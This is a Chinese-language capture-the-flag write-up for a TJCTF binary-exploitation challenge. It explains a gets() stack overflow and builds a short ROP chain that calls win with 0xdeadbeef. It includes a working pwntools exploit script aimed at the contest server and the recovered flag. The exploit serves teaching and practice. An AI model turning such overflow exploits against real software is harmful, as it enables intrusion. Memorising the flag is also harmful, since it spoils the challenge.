# ring-opening-polymerization

## 题目简述

程序在 `main` 中对 8 字节栈缓冲区调用 `gets`，可直接覆盖保存的 RBP 和返回地址。二进制关闭 PIE 与栈保护，并提供 `win(uint64_t i)`：只有参数等于 `0xdeadbeef` 时才输出已读入的 flag。因此构造一条最小 ROP 链设置 `RDI` 后调用 `win` 即可。

## 解题过程

从 `buf` 起到返回地址的距离是 16 字节：8 字节缓冲区加 8 字节保存的 RBP。二进制中的 `gadget1` 明确提供：

```asm
pop rdi
ret
```

ROP 链依次放置 `pop rdi; ret`、参数 `0xdeadbeef`、一个单独 `ret` 和 `win`。额外 `ret` 用于在进入含有 libc 调用的 `win` 前恢复 SysV AMD64 要求的 16 字节栈对齐。

```python
from pwn import *

elf = context.binary = ELF("./out", checksec=False)
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
align = rop.find_gadget(["ret"])[0]

payload = flat(
    b"A" * 16,
    pop_rdi,
    0xdeadbeef,
    align,
    elf.sym["win"],
)

io = remote("tjc.tf", 31457)
io.sendline(payload)
print(io.recvall().decode())
```

`win` 先打印参数，再在比较成功后输出：

```text
tjctf{bby-rop-1823721665as87d86a5}
```

## 方法总结

- `gets` 对栈缓冲区没有长度限制，是确定的返回地址覆盖原语。
- x86-64 的第一个整数参数放在 `RDI`，所以 `pop rdi; ret` 加目标常量即可满足 `win` 条件。
- 利用脚本应从 ELF 动态解析 gadget 和符号，避免把官方样本中的固定地址当成跨编译版本不变的常量。
